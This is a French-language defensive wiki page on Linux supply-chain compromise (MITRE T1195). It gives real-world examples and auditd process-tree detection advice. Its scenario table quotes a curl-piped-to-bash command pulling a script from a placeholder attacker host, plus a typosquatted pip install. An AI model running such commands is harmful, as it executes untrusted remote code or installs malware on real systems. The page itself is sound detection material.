---
title: "Compromission de la chaîne d'approvisionnement"
description: "Un logiciel ou une dépendance de confiance est piégé, et infecte tous ses utilisateurs ; ou un administrateur lance lui-même un script ou un paquet malveillant."
tags: [linux, supply-chain, auditd]
updated: 2026-11-19
draft: false
type: technique
attack_id: T1195
tactic: initial-access
severity: high
platforms: [Linux]
data_sources: [auditd]
related:
  - 03-menaces-detection/initial-access/exploitation-application-publique
---

## Description

L'attaquant compromet d'abord un logiciel, puis infecte tous ses utilisateurs par une mise à jour piégée. Un serveur Linux utilise des centaines de dépendances maintenues par des développeurs différents : l'attaque peut venir de n'importe où. Exemples réels :

- une porte dérobée dans la bibliothèque XZ Utils, utilisée par SSH, a failli compromettre des millions de serveurs ;
- la compromission de tj-actions a fait fuiter des milliers de secrets (clés SSH, jetons d'accès).

Proches, mais déclenchées par une personne : les attaques qui comptent sur un administrateur pour lancer lui-même le malware. Sous Linux, phishing et clés USB marchent mal (serveurs gérés par des techniciens), mais :

| Scénario | Ce qui se passe |
| --- | --- |
| Script de forum | Un administrateur lance sans le lire un script trouvé sur un forum, `curl https://shadyforum.thm/fix.sh \| bash` : c'était un malware, qui infecte le serveur sans bruit. |
| Paquet mal tapé | Un développeur se trompe d'une lettre, `pip3 install fastpi` au lieu de `fastapi` : le paquet mal orthographié était un malware publié exprès par l'attaquant. |

## Ce qu'on observe

Une application ou un service interne **de confiance** qui se met soudain à lancer des commandes malveillantes, par exemple un service interne qui lance `wget`.

## Détection

### auditd

Partir de la commande suspecte (alerte, connexion vers une IP malveillante) et remonter l'arbre des processus jusqu'à ce qui l'a lancée : [méthode](../../01-fondamentaux/journaux-linux.md#remonter-larbre-des-processus). Si le parent est un service interne de confiance, penser à la chaîne d'approvisionnement.

## Faux positifs

À compléter.

## Réponse

À compléter.
